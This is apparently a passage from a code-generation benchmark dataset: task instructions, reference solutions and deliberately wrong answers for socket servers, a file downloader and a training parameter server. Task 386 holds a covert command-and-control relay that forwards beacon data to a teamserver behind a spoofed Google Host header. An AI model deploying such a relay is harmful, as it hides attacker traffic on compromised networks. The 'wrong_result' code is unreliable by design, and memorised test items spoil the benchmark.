local_nonce+hmac_check, 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)\n            elif m.cmd == tinytuya.SESS_KEY_NEG_FINISH:\n                rkey_hmac = hmac.new(real_key, local_nonce, sha256).digest()\n                tmp_key = bytes([a^b for (a,b) in zip(remote_nonce,local_nonce)])\n                cipher = tinytuya.AESCipher(real_key)\n                tmp_key = cipher.encrypt(tmp_key, use_base64=False, pad=False, iv=miv)[12:28]\n            elif m.cmd == tinytuya.DP_QUERY_NEW:\n                resp = {'protocol': 4, 't': int(time.time()), 'data': {'dps': {'20': True, '21': 'white', '22': 946, '23': 3, '24': '014a03e803a9', '25': '04464602007803e803e800000000464602007803e8000a00000000', '26': 0, '34': False}}}\n                msg = tinytuya.TuyaMessage(seqno, 16, 0, json.dumps(resp).encode('ascii'), 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)\n            else:\n                msg = tinytuya.TuyaMessage(seqno, 16, 0, b'json obj data unvalid', 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nimport select\nimport hmac\nimport hashlib\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport base64\nimport os\n\nbind_host = '::1'\nbind_port = 8888\nreal_key = b'secret_key_1234567890'\n\ndef main():\n    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((bind_host, bind_port))\n    sock.listen(5)\n    \n    clients = [sock]\n    sessions = {}\n    seq_num = 0\n    \n    while True:\n        readable, _, _ = select.select(clients, [], [])\n        \n        for sock in readable:\n            if sock is sock:\n                conn, addr = sock.accept()\n                clients.append(conn)\n                sessions[conn] = {\n                    'seq': 0,\n                    'key': None,\n                    'nonce': None,\n                    'state': 'init',\n                    'last_active': os.getpid()\n                }\n            else:\n                try:\n                    data = sock.recv(4096)\n                    if not data:\n                        clients.remove(sock)\n                        del sessions[sock]\n                        continue\n                    \n                    msg_type = data[:4]\n                    session = sessions[sock]\n                    \n                    if msg_type == b'\\x01\\x00\\x00\\x00':\n                        # SESS_KEY_NEG_START\n                        nonce = os.urandom(16)\n                        session['nonce'] = nonce\n                        session['state'] = 'negotiating'\n                        session['seq'] = 0\n                        msg = b'\\x02\\x00\\x00\\x00' + nonce\n                        sock.sendall(msg)\n                        \n                    elif msg_type == b'\\x02\\x00\\x00\\x00':\n                        # SESS_KEY_NEG_FINISH\n                        nonce = data[4:]\n                        combined = session['nonce'] + nonce\n                        shared_key = hmac.new(real_key, combined, hashlib.sha256).digest()\n                        session['key'] = shared_key\n                        session['state'] = 'established'\n                        \n                    elif msg_type == b'\\x03\\x00\\x00\\x00':\n                        # DP_QUERY_NEW\n                        mock_response = b'device_status_ok'\n                        iv = b'\\x00'*16\n                        cipher = AES.new(session['key'], AES.MODE_CBC, iv)\n                        padded = pad(mock_response, AES.block_size)\n                        ciphertext = cipher.encrypt(padded)\n                        hmac_hash = hmac.new(real_key, ciphertext, hashlib.sha256).digest()\n                        msg = b'\\x03\\x00\\x00\\x00' + hmac_hash + ciphertext\n                        sock.sendall(msg)\n                        \n                    else:\n                        # Malformed message\n                        error_msg = b'\\xff\\x00\\x00\\x00'\n                        sock.sendall(error_msg)\n                    \n                    session['last_active'] = os.getpid()\n                    \n                except Exception as e:\n                    clients.remove(sock)\n                    del sessions[sock]\n\nif __name__ == '__main__':\n    main()"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Implement a TCP server that handles client connections, processes incoming data, and interacts with a teamserver through HTTP requests. The server should be able to read and write data based on client requests.\n\nFunction Description: The function `cc2_tcp_server` creates a TCP server that listens for client connections on a specified port. It processes incoming messages to either read data from or write data to a teamserver via HTTP requests. The server handles each client connection in a loop, processing the data and closing the connection afterward.\n\nInput: None (The function binds to a hardcoded IP address and port, and processes incoming client connections.)\n\nOutput: None (The function sends responses to clients but does not return any value.)\n\n---\n\nTask Description: Implement helper functions to support the TCP server's operations, including reading from and writing to a teamserver, parsing raw data, and extracting beacon data.\n\nFunction Description: The function `read_cs_teamserver` sends an HTTP GET request to a teamserver with metadata and extracts beacon data from the response. The function `write_cs_teamserver` sends an HTTP POST request to a teamserver with metadata. The function `parseRawData` splits raw data into a beacon ID and metadata. The function `find_beacon_data` extracts beacon data from a string based on prefix and suffix markers.\n\nInput:\n- `read_cs_teamserver`: `metadata` (str) - The metadata to include in the HTTP GET request.\n- `write_cs_teamserver`: `id` (str) - The beacon ID to include in the HTTP POST request URL; `metadata` (str) - The metadata to include in the HTTP POST request body.\n- `parseRawData`: `rawData` (str) - The raw data string to parse.\n- `find_beacon_data`: `prefix` (str) - The prefix marker for beacon data; `suffix` (str) - The suffix marker for beacon data; `data` (str) - The string to search for beacon data.\n\nOutput:\n- `read_cs_teamserver`: `beacon_data` (str) - The extracted beacon data from the HTTP response.\n- `write_cs_teamserver`: None (The function sends an HTTP POST request but does not return any value.)\n- `parseRawData`: `bid` (str) - The extracted beacon ID; `metadata` (str) - The extracted metadata.\n- `find_beacon_data`: `beacon_data` (str) - The extracted beacon data, or an empty string if not found.",
    "Canonical_solution": "import socket\nimport requests\n\ndef cc2_tcp_server():\n    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sockobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)\n    sockobj.bind(('127.0.0.1', 7777))\n    sockobj.listen(1000)\n\n    while True:\n        connection, address = sockobj.accept()\n        msgHeader = connection.recv(7)\n        if msgHeader == 'read|||':\n            data = connection.recv(10024)\n            metadata = read_cs_teamserver(data)\n            if len(metadata) > 0:\n                connection.send(metadata)\n        elif msgHeader == 'write||':\n            rawData = connection.recv(10024)\n            bid, metadata = parseRawData(rawData)\n            if len(metadata) > 0 and len(bid) > 0:\n                write_cs_teamserver(bid, metadata)\n        connection.close()\n\ndef read_cs_teamserver(metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_get_send\",\n                \"Cookie\": \"SESSION={}\".format(metadata),\n                \"Connection\": \"cc2_rebind_protocol_get_send\"\n    }\n    res = requests.get(\"http://127.0.0.1:443/aaaaaaaaa\", headers=headers)\n    start = \"ffffffff1\"\n    end = \"eeeeeeee2\"\n    beacon_data = find_beacon_data(start, end, res.content)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_post_send\",\n                \"Connection\": \"keep-alive\",\n                \"Content-Length\": \"{}\".format(len(metadata))\n    }\n    res = requests.post(\"http://127.0.0.1:443/bbbbbbbbb?SESSION={}\".format(id), headers=headers, data=metadata)\n\ndef parseRawData(rawData):\n    split = '->|<-'\n    split_index = rawData.find(split)\n    bid = rawData[:split_index]\n    metadata = rawData[len(split)+split_index:]\n    return bid,metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    s_index = data.find(prefix) + 1\n    s_end = data.find(suffix)\n    beacon_data = ''\n    if (s_index > 0 and s_end > 0 and (s_index + len(prefix) + 1) != s_end:\n        beacon_data = data[s_index + len(prefix):s_end]\n    return beacon_data",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nimport requests\n\ndef cc2_tcp_server():\n    host = '127.0.0.1'\n    port = 12345\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind((host, port))\n        s.listen(5)\n        print(f\"Server listening on {host}:{port}\")\n        while True:\n            conn, addr = s.accept()\n            with conn:\n                print(f\"Connected by {addr}\")\n                data = conn.recv(1024)\n                if data:\n                    bid, metadata = parseRawData(data.decode())\n                    write_cs_teamserver(bid, metadata)\n                    conn.sendall(b\"Data sent to teamserver\")\n\ndef read_cs_teamserver(metadata):\n    url = f'http://teamserver.com/api/read?metadata={metadata}'\n    response = requests.get(url)\n    response_text = response.text\n    beacon_data = find_beacon_data('BEGIN_BEACON', 'END_BEACON', response_text)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    url = f'http://teamserver.com/api/write/{id}'\n    response = requests.post(url, data=metadata)\n\ndef parseRawData(rawData):\n    bid, metadata = rawData.split(':', 1)\n    return bid, metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    start = data.find(prefix)\n    if start == -1:\n        return ''\n    end = data.find(suffix, start + len(prefix))\n    if end == -1:\n        return ''\n    return data[start + len(prefix):end]"
  },
  {
    "Task_id": 39,
    "Instruction": "Task Description: Create a Python class that handles downloading files from a given URL and provides methods to retrieve the file name and read the file content.\n\nClass Description: The `UrlFile` class is designed to download files from a specified URL, manage temporary storage of the downloaded file, and provide methods to access the file name and content. It uses the `httpx` library for HTTP requests and handles temporary file storage with `tempfile`.\n\nAttributes:\n\n- url: str - The URL from which the file will be downloaded.\n- name: Optional[str] - An optional custom name for the downloaded file. If not provided, the name is derived from the URL.\n\nMethods:\n\n- get_filename() -> Optional[str] - Returns the filename derived from the URL or the custom name if provided.\n- read() -> Any - Downloads the file from the URL, saves it to a temporary directory, and returns a file-like object for reading the content. Raises an exception if the download fails or if the filename cannot be determined.",
    "Canonical_solution": "import httpx\nfrom pathlib import Path\nfrom typing import Any, Optional\nfrom tempfile import TemporaryDirectory\n\nclass UrlFile:\n    def __init__(self, url: str, name: Optional[str] = None):\n        self.url = url\n        self.name = name\n\n    def get_filename(self) -> Optional[str]:\n        return self.name or self.url.split(\"/\")[-1]\n\n    def read(self) -> Any:\n        logger.debug(f\"Downloading url: {self.url}\")\n        with httpx.Client() as client:\n            response = client.get(self.url)\n            response.raise_for_status()\n\n            with TemporaryDirectory() as temp_dir:\n                file_name = self.get_filename()\n                if file_name is None:\n                    raise ValueError(\"Could not determine a file name, please set `name`\")\n\n                file_path = Path(temp_dir).joinpath(file_name)\n                file_path.write_bytes(response.content)\n                logger.debug(f\"File downloaded and saved to {file_path.name}\")\n                return file_path.open(\"rb\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "import httpx\nimport tempfile\nfrom urllib.parse import urlparse\n\nclass UrlFile:\n    def __init__(self, url, name=None):\n        self.url = url\n        self.name = name\n\n    def get_filename(self):\n        if self.name:\n            return self.name\n        parsed = urlparse(self.url)\n        path = parsed.path\n        if not path:\n            return 'downloaded_file'\n        parts = path.split('/')\n        return parts[-1] if parts else 'downloaded_file'\n\n    def read(self):\n        try:\n            response = httpx.get(self.url)\n            response.raise_for_status()\n        except httpx.HTTPStatusError as e:\n            raise RuntimeError(f\"Failed to download file: {e}\") from e\n        except Exception as e:\n            raise RuntimeError(f\"Failed to download file: {e}\") from e\n\n        filename = self.get_filename()\n        if not filename:\n            raise ValueError(\"Filename cannot be determined\")\n\n        with tempfile.NamedTemporaryFile(prefix=filename, suffix='.tmp', delete=False) as tmp:\n            tmp.write(response.content)\n            tmp_path = tmp.name\n\n        with open(tmp_path, 'rb') as f:\n            return f"
  },
  {
    "Task_id": 395,
    "Instruction": "Task Description: Create a TCP socket server implementation in Python that can handle multiple client connections asynchronously, with support for basic socket operations like accepting connections, sending/receiving data, and reading lines.\n\nClass Description: The implementation consists of two main classes: Listener (for server sockets) and Connection (for client connections), along with supporting event classes for asynchronous operations.\n\nAttributes:\n\nListener:\n- _closed: bool - Flag indicating if the socket is closed\n- host: str - The host address the server is bound to\n- port: int - The port number the server is listening on\n- sock: socket.socket - The underlying TCP socket object\n\nConnection:\n- sock: socket.socket - The connected socket object\n- addr: tuple - The client address (host, port)\n- _buf: bytes - Internal buffer for storing received data\n- _closed: bool - Flag indicating if the connection is closed\n\nMethods:\n\nListener:\n- __init__(host: str, port: int) -> None - Creates and binds a TCP socket to the specified host and port\n- accept() -> AcceptEvent - Returns an event that waits for and accepts incoming connections\n- close() -> None - Immediately closes the listening socket\n\nConnection:\n- __init__(sock: socket.socket, addr: tuple) -> None - Initializes a new connection with given socket and address\n- close() -> None - Closes the connection\n- recv(size: int) -> ReceiveEvent - Returns an event that receives up to size bytes of data\n- send(data: bytes) -> SendEvent - Returns an event that sends data (returns bytes sent)\n- sendall(data: bytes) -> SendEvent - Returns an event that sends all data\n- readline(terminator: bytes = b\"\\n\", bufsize: int = 1024) -> Generator[ReturnEvent, None, None] - Returns a generator that yields events to read a line\n\nSupporting Event Classes:\n- AcceptEvent(listener: Listener) - Event for accepting connections\n- ReceiveEvent(conn: Connection, bufsize: int) - Event for receiving data\n- SendEvent(conn: Connection, data: bytes, sendall: bool = False) - Event for sending data\n- WaitableEvent - Base class for all waitable events\n- ReturnEvent(value: Any) - Event for returning a value",
    "Canonical_solution": "import socket\nimport select\nimport time\nimport types\nimport collections\nimport errno\nimport sys\nimport traceback\n\nclass Listener:\n    \"\"\"A socket wrapper object for listening sockets.\"\"\"\n\n    def __init__(self, host, port):\n        \"\"\"Create a listening socket on the given hostname and port.\"\"\"\n        self._closed = False\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((host, port))\n        self.sock.listen(5)\n\n    def accept(self):\n        \"\"\"An event that waits for a connection on the listening socket.\n        When a connection is made, the event returns a Connection\n        object.\n        \"\"\"\n        if self._closed:\n            raise SocketClosedError()\n        return AcceptEvent(self)\n\n    def close(self):\n        \"\"\"Immediately close the listening socket. (Not an event.)\"\"\"\n        self._closed = True\n        self.sock.close()\n\nclass Connection:\n    \"\"\"A socket wrapper object for connected sockets.\"\"\"\n\n    def __init__(self, sock, addr):\n        self.sock = sock\n        self.addr = addr\n        self._buf = b\"\"\n        self._closed = False\n\n    def close(self):\n        \"\"\"Close the connection.\"\"\"\n        self._closed = True\n        self.sock.close()\n\n    def recv(self, size):\n        \"\"\"Read at most size bytes of data from the socket.\"\"\"\n        if self._closed:\n            raise SocketClosedError()\n\n        if self._buf:\n            out = self._buf[:size]\n            self._buf = self._buf[size:]\n            return ValueEvent(out)\n        else:\n            return ReceiveEvent(self, size)\n\n    def send(self, data):\n        \"\"\"Sends data on the socket, returning the number of bytes\n        successfully sent.\n        \"\"\"\n        if self._closed:\n            raise SocketClosedError()\n        return SendEvent(self, data)\n\n    def sendall(self, data):\n        \"\"\"Send all of data on the socket.\"\"\"\n        if self._closed:\n            raise SocketClosedError()\n        return SendEvent(self, data, True)\n\n    def readline(self, terminator=b\"\\n\", bufsize=1024):\n        \"\"\"Reads a line (delimited by terminator) from the socket.\"\"\"\n        if self._closed:\n            raise SocketClosedError()\n\n        while True:\n            if terminator in self._buf:\n                line, self._buf = self._buf.split(terminator, 1)\n                line += terminator\n                yield ReturnEvent(line)\n                break\n            data = yield ReceiveEvent(self, bufsize)\n            if data:\n                self._buf += data\n            else:\n                line = self._buf\n                self._buf = b\"\"\n                yield ReturnEvent(line)\n                break\n\nclass AcceptEvent(WaitableEvent):\n    \"\"\"An event for Listener objects (listening sockets) that suspends\n    execution until the socket gets a connection.\n    \"\"\"\n\n    def __init__(self, listener):\n        self.listener = listener\n\n    def waitables(self):\n        return (self.listener.sock,), (), ()\n\n    def fire(self):\n        sock, addr = self.listener.sock.accept()\n        return Connection(sock, addr)\n\nclass ReceiveEvent(WaitableEvent):\n    \"\"\"An event for Connection objects (connected sockets) for\n    asynchronously reading data.\n    \"\"\"\n\n    def __init__(self, conn, bufsize):\n        self.conn = conn\n        self.bufsize = bufsize\n\n    def waitables(self):\n        return (self.conn.sock,), (), ()\n\n    def fire(self):\n        return self.conn.sock.recv(self.bufsize)\n\nclass SendEvent(WaitableEvent):\n    \"\"\"An event for Connection objects (connected sockets) for\n    asynchronously writing data.\n    \"\"\"\n\n    def __init__(self, conn, data, sendall=False):\n        self.conn = conn\n        self.data = data\n        self.sendall = sendall\n\n    def waitables(self):\n        return (), (self.conn.sock,), ()\n\n    def fire(self):\n        if self.sendall:\n            return self.conn.sock.sendall(self.data)\n        else:\n            return self.conn.sock.send(self.data)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nimport asyncio\n\nclass Listener:\n    def __init__(self, host, port):\n        self._closed = False\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((host, port))\n        self.sock.listen(5)\n\n    def accept(self):\n        return AcceptEvent(self)\n\n    def close(self):\n        self._closed = True\n        self.sock.close()\n\nclass Connection:\n    def __init__(self, sock, addr):\n        self.sock = sock\n        self.addr = addr\n        self._buf = b''\n        self._closed = False\n\n    def close(self):\n        self._closed = True\n        self.sock.close()\n\n    def recv(self, size):\n        return ReceiveEvent(self, size)\n\n    def send(self, data):\n        return SendEvent(self, data, sendall=False)\n\n    def sendall(self, data):\n        return SendEvent(self, data, sendall=True)\n\n    async def readline(self, terminator=b\"\\n\", bufsize=1024):\n        while True:\n            data = await self.recv(bufsize)\n            if not data:\n                break\n            lines = data.split(terminator)\n            for line in lines[:-1]:\n                yield ReturnEvent(line)\n            if lines[-1]:\n                continue\n            else:\n                break\n\nclass AcceptEvent:\n    def __init__(self, listener):\n        self.listener = listener\n\n    async def wait(self):\n        sock, addr = self.listener.sock.accept()\n        return Connection(sock, addr)\n\nclass ReceiveEvent:\n    def __init__(self, conn, bufsize):\n        self.conn = conn\n        self.bufsize = bufsize\n\n    async def wait(self):\n        data = await self.conn.sock.recv(self.bufsize)\n        return ReturnEvent(data)\n\nclass SendEvent:\n    def __init__(self, conn, data, sendall):\n        self.conn = conn\n        self.data = data\n        self.sendall = sendall\n\n    async def wait(self):\n        if self.sendall:\n            sent = await self.conn.sock.sendall(self.data)\n        else:\n            sent = await self.conn.sock.send(self.data)\n        return ReturnEvent(sent)\n\nclass ReturnEvent:\n    def __init__(self, value):\n        self.value = value\n\n    def get(self):\n        return self.value\n\nclass WaitableEvent:\n    pass\n\nclass AcceptEvent(WaitableEvent):\n    def __init__(self, listener):\n        self.listener = listener\n\n    async def wait(self):\n        sock, addr = self.listener.sock.accept()\n        return Connection(sock, addr)\n\nclass ReceiveEvent(WaitableEvent):\n    def __init__(self, conn, bufsize):\n        self.conn = conn\n        self.bufsize = bufsize\n\n    async def wait(self):\n        data = await self.conn.sock.recv(self.bufsize)\n        return ReturnEvent(data)\n\nclass SendEvent(WaitableEvent):\n    def __init__(self, conn, data, sendall):\n        self.conn = conn\n        self.data = data\n        self.sendall = sendall\n\n    async def wait(self):\n        if self.sendall:\n            sent = await self.conn.sock.sendall(self.data)\n        else:\n            sent = await self.conn.sock.send(self.data)\n        return ReturnEvent(sent)\n\nclass ReturnEvent(WaitableEvent):\n    def __init__(self, value):\n        self.value = value\n\n    def get(self):\n        return self.value"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Implement a TCP server using Python's socket module with asynchronous I/O operations managed by a custom scheduler. The server should handle multiple client connections, echo received data back to clients, and properly manage socket resources.\n\nClass Description: The implementation consists of several classes that work together to create an asynchronous TCP server. The main classes include Socket (a wrapper for socket operations), ReadSocket/WriteSocket/AcceptSocket (operation handlers), and EchoServer (the main server logic).\n\nAttributes:\n\n- Socket._sock: socket.socket - The underlying socket object being wrapped\n- ReadSocket.sock: socket.socket - The socket to read from\n- ReadSocket.nbytes: int - Maximum bytes to read\n- WriteSocket.sock: socket.socket - The socket to write to\n- WriteSocket.data: bytes - Data to be sent\n- AcceptSocket.sock: socket.socket - The socket to accept connections from\n- EchoServer.sched: object - The scheduler instance managing tasks\n\nMethods:\n\n- Socket.__init__(sock: socket.socket) -> None - Initialize with a socket object\n- Socket.recv(maxbytes: int) -> ReadSocket - Create a read operation\n- Socket.send(data: bytes) -> WriteSocket - Create a write operation\n- Socket.accept() -> AcceptSocket - Create an accept operation\n- Socket.__getattr__(name: str) -> Any - Proxy attribute access to underlying socket\n- ReadSocket.handle_yield(sched: object, task: object) -> None - Register read operation with scheduler\n- ReadSocket.handle_resume(sched: object, task: object) -> None - Complete read operation\n- WriteSocket.handle_yield(sched: object, task: object) -> None - Register write operation with scheduler\n- WriteSocket.handle_resume(sched: object, task: object) -> None - Complete write operation\n- AcceptSocket.handle_yield(sched: object, task: object) -> None - Register accept operation with scheduler\n- AcceptSocket.handle_resume(sched: object, task: object) -> None - Complete accept operation\n- EchoServer.__init__(addr: tuple, sched: object) -> None - Initialize server with address and scheduler\n- EchoServer.server_loop(addr: tuple) -> generator - Main server loop accepting connections\n- EchoServer.client_handler(client: Socket) -> generator - Handle client communication",
    "Canonical_solution": "from collections import deque\nfrom select import select\nfrom socket import socket, AF_INET, SOCK_STREAM\n\nclass Socket:\n    def __init__(self, sock):\n        self._sock = sock\n    \n    def recv(self, maxbytes):\n        return ReadSocket(self._sock, maxbytes)\n    \n    def send(self, data):\n        return WriteSocket(self._sock, data)\n    \n    def accept(self):\n        return AcceptSocket(self._sock)\n    \n    def __getattr__(self, name):\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock, nbytes):\n        self.sock = sock\n        self.nbytes = nbytes\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        data = self.sock.recv(self.nbytes)\n        sched.add_ready(task, data)\n\nclass WriteSocket:\n    def __init__(self, sock, data):\n        self.sock = sock\n        self.data = data\n    \n    def handle_yield(self, sched, task):\n        sched._write_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        nsent = self.sock.send(self.data)\n        sched.add_ready(task, nsent)\n\nclass AcceptSocket:\n    def __init__(self, sock):\n        self.sock = sock\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        r = self.sock.accept()\n        sched.add_ready(task, r)\n\nclass EchoServer:\n    def __init__(self, addr, sched):\n        self.sched = sched\n        sched.new(self.server_loop(addr))\n    \n    def server_loop(self, addr):\n        s = Socket(socket(AF_INET, SOCK_STREAM))\n        s.bind(addr)\n        s.listen(5)\n        while True:\n            c, a = yield s.accept()\n            print('Got connection from', a)\n            self.sched.new(self.client_handler(Socket(c)))\n    \n    def client_handler(self, client):\n        while True:\n            line = yield from readline(client)\n            if not line:\n                break\n            line = b'GOT:' + line\n            while line:\n                nsent = yield client.send(line)\n                line = line[nsent:]\n        client.close()\n        print('Client closed')",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\n\nclass Socket:\n    def __init__(self, sock):\n        self._sock = sock\n\n    def recv(self, maxbytes):\n        return ReadSocket(self._sock, maxbytes)\n\n    def send(self, data):\n        return WriteSocket(self._sock, data)\n\n    def accept(self):\n        return AcceptSocket(self._sock)\n\n    def __getattr__(self, name):\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock, nbytes):\n        self.sock = sock\n        self.nbytes = nbytes\n\n    def handle_yield(self, sched, task):\n        sched.schedule(task, self._read)\n\n    def handle_resume(self, sched, task):\n        data = self.sock.recv(self.nbytes)\n        if data:\n            WriteSocket(self.sock, data).handle_yield(sched, task)\n\n    def _read(self):\n        data = self.sock.recv(self.nbytes)\n        if data:\n            self.handle_resume(self.sched, self)\n\nclass WriteSocket:\n    def __init__(self, sock, data):\n        self.sock = sock\n        self.data = data\n\n    def handle_yield(self, sched, task):\n        sched.schedule(task, self._write)\n\n    def handle_resume(self, sched, task):\n        self.sock.send(self.data)\n        self.sock.recv(1024).handle_yield(sched, task)\n\n    def _write(self):\n        self.sock.send(self.data)\n        self.handle_resume(self.sched, self)\n\nclass AcceptSocket:\n    def __init__(self, sock):\n        self.sock = sock\n\n    def handle_yield(self, sched, task):\n        sched.schedule(task, self._accept)\n\n    def handle_resume(self, sched, task):\n        client, addr = self.sock.accept()\n        client_socket = Socket(client)\n        client_socket.recv(1024).handle_yield(sched, task)\n\n    def _accept(self):\n        client, addr = self.sock.accept()\n        client_socket = Socket(client)\n        client_socket.recv(1024).handle_yield(self.sched, self)\n\nclass EchoServer:\n    def __init__(self, addr, sched):\n        self.sched = sched\n        self.addr = addr\n\n    def server_loop(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(self.addr)\n        sock.listen(5)\n        while True:\n            client, addr = sock.accept()\n            client_socket = Socket(client)\n            client_socket.recv(1024).handle_yield(self.sched, self)\n\n    def client_handler(self, client):\n        while True:\n            read_op = client.recv(1024)\n            read_op.handle_yield(self.sched, self)\n            data = read_op.handle_resume(self.sched, self)\n            if not data:\n                break\n            write_op = client.send(data)\n            write_op.handle_yield(self.sched, self)"
  },
  {
    "Task_id": 408,
    "Instruction": "Task Description: Implement a parameter server that handles client requests for model parameters, replay submissions, and draining operations using a threaded TCP server.\n\nClass Description: ParameterServer is a TCP-based server that manages model parameters and replay buffers for distributed training. It handles concurrent client connections and provides thread-safe operations for parameter exchange and replay buffer management.\n\nAttributes:\n\nstate: [State] - Dataclass containing server state including buffer directories, capacity, locks, and parameter versions\nbuffer_dir: [str] - Directory path for storing incoming replay buffers\ndrain_dir: [str] - Directory path for draining replay buffers to trainers\ncapacity: [int] - Maximum capacity of the replay buffer\nforce_sequential: [bool] - Flag to enforce sequential parameter updates\ndir_lock: [Lock] - Thread lock for directory operations\nparam_lock: [Lock] - Thread lock for parameter operations\nbuffer_size: [int] - Current size of the replay buffer\nsubmission_id: [int] - Counter for replay submissions\nmortal_param: [Optional[OrderedDict]] - Current mortal model parameters\ndqn_param: [Optional[OrderedDict]] - Current DQN model parameters\nparam_version: [int] - Version counter for parameter updates\nidle_param_version: [int] - Version marker for idle trainers\n\nMethods:\n\n__init__: [Name](buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool) -> [None] - Initializes the parameter server with buffer directories, capacity, and sequential flag\nstart_server: [Name](host: str, port: int) -> [None] - Starts the threaded TCP server on specified host and port\nhandle_get_param: [Name](msg: dict) -> [None] - Handles parameter retrieval requests from clients\nhandle_submit_replay: [Name](msg: dict) -> [None] - Handles replay buffer submissions from clients\nhandle_submit_param: [Name](msg: dict) -> [None] - Handles parameter updates from trainers\nhandle_drain: [Name]() -> [None] - Handles draining operations for transferring replay buffers to trainers",
    "Canonical_solution": "from socketserver import ThreadingTCPServer, BaseRequestHandler\nfrom threading import Lock\nfrom typing import Optional\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nimport os\nimport shutil\nimport logging\nimport torch\nfrom io import BytesIO\nfrom common import send_msg, recv_msg\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    force_sequential: bool\n    dir_lock: Lock\n    param_lock: Lock\n    buffer_size: int\n    submission_id: int\n    mortal_param: Optional[OrderedDict]\n    dqn_param: Optional[OrderedDict]\n    param_version: int\n    idle_param_version: int\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(\n            buffer_dir=os.path.abspath(buffer_dir),\n            drain_dir=os.path.abspath(drain_dir),\n            capacity=capacity,\n            force_sequential=force_sequential,\n            dir_lock=Lock(),\n            param_lock=Lock(),\n            buffer_size=0,\n            submission_id=0,\n            mortal_param=None,\n            dqn_param=None,\n            param_version=0,\n            idle_param_version=0,\n        )\n\n    def start_server(self, host: str, port: int):\n        if os.path.isdir(self.state.buffer_dir):\n            shutil.rmtree(self.state.buffer_dir)\n        if os.path.isdir(self.state.drain_dir):\n            shutil.rmtree(self.state.drain_dir)\n        os.makedirs(self.state.buffer_dir)\n        os.makedirs(self.state.drain_dir)\n\n        class Handler(BaseRequestHandler):\n            def handle(self):\n                msg = recv_msg(self.request)\n                match msg['type']:\n                    case 'get_param':\n                        self.handle_get_param(msg)\n                    case 'submit_replay':\n                        self.handle_submit_replay(msg)\n                    case 'submit_param':\n                        self.handle_submit_param(msg)\n                    case 'drain':\n                        self.handle_drain()\n\n            def handle_get_param(self, msg):\n                with self.state.dir_lock:\n                    overflow = self.state.buffer_size >= self.state.capacity\n                    with self.state.param_lock:\n                        has_param = self.state.mortal_param is not None and self.state.dqn_param is not None\n                if overflow:\n                    send_msg(self.request, {'status': 'samples overflow'})\n                    return\n                if not has_param:\n                    send_msg(self.request, {'status': 'empty param'})\n                    return\n\n                client_param_version = msg['param_version']\n                buf = BytesIO()\n                with self.state.param_lock:\n                    if self.state.force_sequential and self.state.idle_param_version <= client_param_version:\n                        res = {'status': 'trainer is busy'}\n                    else:\n                        res = {\n                            'status': 'ok',\n                            'mortal': self.state.mortal_param,\n                            'dqn': self.state.dqn_param,\n                            'param_version': self.state.param_version,\n                        }\n                    torch.save(res, buf)\n                send_msg(self.request, buf.getbuffer(), packed=True)\n\n            def handle_submit_replay(self, msg):\n                with self.state.dir_lock:\n                    for filename, content in msg['logs'].items():\n                        filepath = os.path.join(self.state.buffer_dir, f'{self.state.submission_id}_{filename}')\n                        with open(filepath, 'wb') as f:\n                            f.write(content)\n                    self.state.buffer_size += len(msg['logs'])\n                    self.state.submission_id += 1\n                    logging.info(f'total buffer size: {self.state.buffer_size}')\n\n            def handle_submit_param(self, msg):\n                with self.state.param_lock:\n                    self.state.mortal_param = msg['mortal']\n                    self.state.dqn_param = msg['dqn']\n                    self.state.param_version += 1\n                 